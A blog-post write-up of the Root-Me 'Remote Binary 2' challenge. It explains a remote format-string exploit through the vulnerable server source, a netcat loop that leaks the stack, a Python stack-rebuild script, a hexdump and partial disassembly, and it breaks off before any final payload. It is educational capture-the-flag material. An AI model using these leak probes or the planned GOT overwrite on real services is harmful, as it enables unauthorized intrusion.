<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>[Root-Me] Remote Binary 2 - An advanced remote format string example</title>
  <meta name="description" content="Hello,">

  <link rel="stylesheet" href="/binholic/assets/css/main.css">
  <link rel="canonical" href="/binholic/2013/08/20/root-me-remote-binary-2-advanced-format-string.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/binholic/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/binholic/">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="/binholic/about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="/binholic/blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">[Root-Me] Remote Binary 2 - An advanced remote format string example</h1>
    <p class="post-meta"><time datetime="2013-08-20T21:10:00+02:00" itemprop="datePublished">Aug 20, 2013</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>Hello,</p>

<p>Today, we’re going to exploit a remote format string! :)</p>

<p>It sures changes from classic format strings.</p>

<p>Anyhow, this is a perfect example of a fully reliable remote exploit using info
leaking capabilities.</p>

<p>Like other posts, I will try to explain and develop (almost) the entire exploit
development process.</p>

<p>I hope you like this formula, otherwise tell me.</p>

<p>On to the show,</p>

<h2 id="the-target">The target</h2>

<p>The challenge is located here: <a href="http://www.root-me.org/fr/Challenges/App-Systeme/Remote-binary-2">Remote Binary 2</a> .</p>

<p>The binary is not protected at all, the difficulty lies in that it is in a
remote location.</p>

<p>Here is the source code:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
</pre></td><td class="code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="cp">#define LISTEN_PORT 56006
#define LENGTH 1024
</span>
<span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">ssock</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">recv_loop</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>

  <span class="kt">int</span> <span class="n">csock</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">caddr</span><span class="p">;</span>
  <span class="n">socklen_t</span> <span class="n">clen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">caddr</span><span class="p">);</span>
  <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="n">LENGTH</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">output</span><span class="p">[</span><span class="n">LENGTH</span><span class="p">];</span>

  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">csock</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">caddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clen</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">perror</span><span class="p">(</span><span class="s">"accept()"</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">LENGTH</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">LENGTH</span><span class="p">);</span>

    <span class="n">recv</span><span class="p">(</span><span class="n">csock</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="n">LENGTH</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">snprintf</span> <span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">output</span><span class="p">),</span> <span class="n">input</span><span class="p">);</span>
    <span class="n">output</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">output</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
    <span class="n">send</span><span class="p">(</span><span class="n">csock</span><span class="p">,</span> <span class="n">output</span><span class="p">,</span> <span class="n">LENGTH</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">csock</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">yes</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">saddr</span><span class="p">;</span>

  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
  <span class="p">}</span>

  <span class="n">saddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
  <span class="n">saddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
  <span class="n">saddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">LISTEN_PORT</span><span class="p">);</span>

  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span> <span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"run (pid=%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
      <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">ssock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"socket()"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">yes</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">))</span> <span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">perror</span><span class="p">(</span><span class="s">"setsockopt()"</span><span class="p">);</span>
         <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="k">if</span><span class="p">(</span> <span class="n">bind</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">saddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">saddr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"bind()"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="k">if</span><span class="p">(</span> <span class="n">listen</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"listen()"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="n">recv_loop</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
       <span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
       <span class="n">close</span><span class="p">(</span><span class="n">ssock</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>As we can see, these are infinite loops and it fork() for each received request.
environ is set to 0 so we can’t use it for our shellcode.</p>

<p>I won’t bother you too much with the ASM as you can guess but basically:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// code</span>
<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>translate to a similar structure such as:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre><span class="nl">loop:</span>
    <span class="c1">// code</span>
    <span class="n">jmp</span> <span class="n">loop</span></pre></td></tr></tbody></table></code></pre></figure>

<p>This is important to mention as there won’t be a SEIP that we can really use as
the functions never return there.</p>

<p>Also, since it forks at each and every request, it means we could bruteforce
the child address space. We are not going to do that: it is not really clean,
there is a better solution as you will see through reading the rest of this
article.</p>

<p>Looking a bit further, we locate the vulnerability in recv_loop(), we control
the format string!</p>

<p>There a no overflow however and memory is reset to 0 at each iteration.</p>

<p>There is even some basic error checking to see if accept() succeed.</p>

<p>From there we can devise an attack strategy:</p>

<ul>
  <li>we can write anywhere: let’s patch a GOT entry! We have the choice</li>
  <li>thing is, if we patch send(), close() or accept(), we have to set up our
payload and execute in one go, we cannot check for proper write before for
instance (first rule of an exploit: reliability).</li>
  <li>lucky for us, if accept() fail then it perror() and exit(), we just need to
patch ssock to make accept() fail. We thus can trigger our payload whenever we
want.</li>
</ul>

<p>Thing is, before we can do all that, we need addresses!</p>

<h2 id="infoleak-to-the-rescue">Infoleak to the rescue</h2>

<p>Format strings are useful for reading AND writing!!! So we are going to dump
part of the stack.</p>

<p>This is especially useful for remote processes, ASLR+PIE+DEP binaries for
instance as it allows to completely bypass those protections altogether.</p>

<p>The technique I used here to dump the stack is through
the “direct parameter access”.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="c"># we leak part of the stack</span>
<span class="k">for </span>index <span class="k">in</span> <span class="o">{</span>1..746<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"index </span><span class="nv">$index</span><span class="s2"> = %</span><span class="nv">$index</span><span class="se">\$</span><span class="s2">x"</span> | nc <span class="nt">-v</span> 127.0.0.1 56006 <span class="o">&gt;&gt;</span> dump.raw<span class="p">;</span> <span class="k">done</span>
<span class="c"># we extract only our data (and not the '\x00'..)</span>
strings dump.raw <span class="o">&gt;</span> dump.log</pre></td></tr></tbody></table></code></pre></figure>

<p>There are other techniques such as using %s format string for dumping arbitrary
valid memory locations. This is more hardcore though, I haven’t tried it yet.</p>

<p>Here we got a text file, we would like to have a binary dump:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'Usage: {0} input output'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">input_filename</span><span class="p">,</span> <span class="n">output_filename</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>

<span class="c1"># parse dump.log
</span><span class="n">values</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">with</span> <span class="nb">open</span> <span class="p">(</span><span class="n">input_filename</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">replace</span> <span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">n'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">split</span> <span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
        <span class="n">fields</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span> <span class="p">(</span><span class="s">'='</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">fields</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
            <span class="k">continue</span>

        <span class="n">value</span> <span class="o">=</span> <span class="n">fields</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span> <span class="p">()</span>
        <span class="c1"># value = struct.pack ('&lt;I', value)
</span>        <span class="n">value</span> <span class="o">=</span> <span class="nb">int</span> <span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
        <span class="n">values</span><span class="o">.</span><span class="n">append</span> <span class="p">(</span><span class="n">value</span><span class="p">)</span>

<span class="c1"># reconstruct stack
</span><span class="k">with</span> <span class="nb">open</span> <span class="p">(</span><span class="n">output_filename</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fpw</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>
        <span class="n">bin_val</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
        <span class="n">fpw</span><span class="o">.</span><span class="n">write</span> <span class="p">(</span><span class="n">bin_val</span><span class="p">)</span>

<span class="k">print</span> <span class="s">'{0} parsed to {1}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">input_filename</span><span class="p">,</span> <span class="n">output_filename</span><span class="p">)</span></pre></td></tr></tbody></table></code></pre></figure>

<p>As you can see, it is a much more usable format:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre></td><td class="code"><pre><span class="nv">$ </span>./stack-rebuild.py dump.log dump.bin
dump.log parsed to dump.bin
<span class="nv">$ </span>hexdump <span class="nt">-C</span> dump.bin
00000000  00 00 00 00 00 00 00 00  00 00 00 00 34 20 3d 20  |............4 <span class="o">=</span> |
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<span class="k">*</span>
00000400  00 00 00 00 00 00 00 00  00 00 00 00 32 36 30 20  |............260 |
00000410  3d 20 25 32 36 32 24 78  5c 6e 0a 00 00 00 00 00  |<span class="o">=</span> %262<span class="nv">$x</span><span class="se">\n</span>......|
00000420  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<span class="k">*</span>
00000800  00 00 00 00 00 00 00 00  00 00 00 00 10 00 00 00  |................|
00000810  02 00 8b 6e 7f 00 00 01  00 00 00 00 00 00 00 00  |...n............|
00000820  03 00 00 00 f4 1f fd b7  d7 ff ff bf e8 <span class="nb">fc </span>ff bf  |................|
00000830  38 8a 04 08 00 00 00 00  05 00 00 00 10 00 00 00  |8...............|
00000840  d4 <span class="nb">fc </span>ff bf 04 00 00 00  f4 9f 04 08 01 00 00 00  |................|
00000850  55 85 04 08 e4 23 fd b7  0d 00 00 00 f4 9f 04 08  |U....#..........|
00000860  ff ff ff ff ff ff ff ff  02 00 da c6 00 00 00 00  |................|
00000870  25 02 e6 b7 80 d2 fe b7  01 00 00 00 00 00 00 00  |%...............|
00000880  0b 00 00 00 60 8a 04 08  00 00 00 00 00 00 00 00  |....<span class="sb">`</span>...........|
00000890  d3 64 e4 b7 01 00 00 00  84 fd ff bf 8c fd ff bf  |.d..............|
000008a0  58 c8 fd b7 00 00 00 00  1c fd ff bf 8c fd ff bf  |X...............|
000008b0  00 00 00 00 6c 83 04 08  f4 1f fd b7 00 00 00 00  |....l...........|
000008c0  00 00 00 00 00 00 00 00  15 44 9e 14 05 80 ae 23  |.........D.....#|
000008d0  00 00 00 00 00 00 00 00  00 00 00 00 01 00 00 00  |................|
000008e0  b0 86 04 08 00 00 00 00  b0 26 ff b7 e9 63 e4 b7  |.........&amp;...c..|
000008f0  f4 ef ff b7 01 00 00 00  b0 86 04 08 00 00 00 00  |................|
00000900  d1 86 04 08 63 88 04 08  01 00 00 00 84 fd ff bf  |....c...........|
00000910  60 8a 04 08 d0 8a 04 08  80 d2 fe b7 7c fd ff bf  |<span class="sb">`</span>...........|...|
00000920  18 f9 ff b7 01 00 00 00  8c fe ff bf 00 00 00 00  |................|
00000930  b1 fe ff bf bc fe ff bf  cc fe ff bf e1 fe ff bf  |................|
00000940  1f ff ff bf 3e ff ff bf  5e ff ff bf 6f ff ff bf  |....&gt;...^...o...|
00000950  90 ff ff bf 98 ff ff bf  b0 ff ff bf 00 00 00 00  |................|
00000960  20 00 00 00 14 d4 fd b7  21 00 00 00 00 d0 fd b7  | .......!.......|
00000970  10 00 00 00 ff fb eb 0f  06 00 00 00 00 10 00 00  |................|
00000980  11 00 00 00 64 00 00 00  03 00 00 00 34 80 04 08  |....d.......4...|
00000990  04 00 00 00 20 00 00 00  05 00 00 00 09 00 00 00  |.... ...........|
000009a0  07 00 00 00 00 e0 fd b7  08 00 00 00 00 00 00 00  |................|
000009b0  09 00 00 00 b0 86 04 08  0b 00 00 00 00 04 00 00  |................|
000009c0  0c 00 00 00 00 04 00 00  0d 00 00 00 00 04 00 00  |................|
000009d0  0e 00 00 00 00 04 00 00  17 00 00 00 00 00 00 00  |................|
000009e0  19 00 00 00 6b fe ff bf  1f 00 00 00 d7 ff ff bf  |....k...........|
000009f0  0f 00 00 00 7b fe ff bf  00 00 00 00 00 00 00 00  |....<span class="o">{</span>...........|
00000a00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 80  |................|
00000a10  0f 0c 84 d2 b3 75 b5 2e  54 cf 42 17 94 c5 10 69  |.....u..T.B....i|
00000a20  36 38 36 00 00 00 00 00  00 00 00 00 00 00 00 00  |686.............|
00000a30  2f 63 68 61 6c 6c 65 6e  67 65 2f 72 62 69 6e 61  |/challenge/rbina|
00000a40  72 79 2f 72 62 69 6e 61  72 79 32 2f 72 62 69 6e  |ry/rbinary2/rbin|
00000a50  61 72 79 32 00 00 00 00  00 00 00 00 00 00 00 00  |ary2............|
00000a60  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<span class="k">*</span>
00000b70  00 00 00 00 00 00 00 00  00 00 00 2f 63 68 61 6c  |.........../chal|
00000b80  6c 65 6e 67 65 2f 72 62  69 6e 61 72 79 2f 72 62  |lenge/rbinary/rb|
00000b90  69 6e 61 72 79 32 2f 72  62 69 6e 61 72 79 32 00  |inary2/rbinary2.|
00000ba0  00 00 00 00                                       |....|</pre></td></tr></tbody></table></code></pre></figure>

<p>Now, let dig through it for stack addresses:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="code"><pre><span class="nv">$ </span><span class="nb">grep</span> <span class="s1">'= bf'</span> dump.log
523 <span class="o">=</span> bfffffd7
524 <span class="o">=</span> bffffce8
529 <span class="o">=</span> bffffcd4
551 <span class="o">=</span> bffffd84
552 <span class="o">=</span> bffffd8c
555 <span class="o">=</span> bffffd1c
556 <span class="o">=</span> bffffd8c
580 <span class="o">=</span> bffffd84
584 <span class="o">=</span> bffffd7c
587 <span class="o">=</span> bffffe8c
589 <span class="o">=</span> bffffeb1
590 <span class="o">=</span> bffffebc
591 <span class="o">=</span> bffffecc
592 <span class="o">=</span> bffffee1
593 <span class="o">=</span> bfffff1f
594 <span class="o">=</span> bfffff3e
595 <span class="o">=</span> bfffff5e
596 <span class="o">=</span> bfffff6f
597 <span class="o">=</span> bfffff90
598 <span class="o">=</span> bfffff98
599 <span class="o">=</span> bfffffb0
634 <span class="o">=</span> bffffe6b
636 <span class="o">=</span> bfffffd7
638 <span class="o">=</span> bffffe7b</pre></td></tr></tbody></table></code></pre></figure>

<p>Neat, we have a couple of stack addresses. For now, we don’t know to what
they map to.</p>

<p>Anyhow, we mainly need offsets now to esp, ebp, input_buffer and output_buffer.
Let’s see how to get them from rbinary2.</p>

<h2 id="getting-addresses-offsets-out-of-the-binary">Getting addresses offsets out of the binary</h2>

<h3 id="addresses">Addresses</h3>

<p>For extracting addresses we’are interested in, we are going to use GDB
for disassembly and readelf for GOT addresses.</p>

<p>Let’s disassemble it! (I’ve cutted part of the disassembly, only showing
parts of interest)</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="code"><pre><span class="n">gdb</span><span class="err">$</span> <span class="n">disassemble</span> <span class="n">recv_loop</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">recv_loop</span><span class="o">:</span>
   <span class="mh">0x08048764</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span> <span class="k">push</span>   <span class="n">ebp</span>
   <span class="mh">0x08048765</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x08048767</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span> <span class="k">push</span>   <span class="n">edi</span>
   <span class="mh">0x08048768</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span> <span class="k">push</span>   <span class="n">ebx</span>
   <span class="mh">0x08048769</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span> <span class="k">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x830</span>
   <span class="mh">0x0804876f</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x20</span><span class="err">]</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048776</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x804a064</span>
<span class="o">&lt;</span><span class="p">...</span><span class="o">&gt;</span>
   <span class="mh">0x080487a6</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[esp],</span><span class="mh">0x1</span>
   <span class="mh">0x080487ad</span> <span class="o">&lt;+</span><span class="mi">73</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x80485f0</span> <span class="o">&lt;</span><span class="n">exit</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="c">; memset</span>
   <span class="mh">0x080487b2</span> <span class="o">&lt;+</span><span class="mi">78</span><span class="o">&gt;:</span> <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x420</span><span class="err">]</span>
   <span class="mh">0x080487b8</span> <span class="o">&lt;+</span><span class="mi">84</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x080487ba</span> <span class="o">&lt;+</span><span class="mi">86</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x080487bf</span> <span class="o">&lt;+</span><span class="mi">91</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x100</span>
   <span class="mh">0x080487c4</span> <span class="o">&lt;+</span><span class="mi">96</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">ebx</span>
   <span class="mh">0x080487c6</span> <span class="o">&lt;+</span><span class="mi">98</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">edx</span>
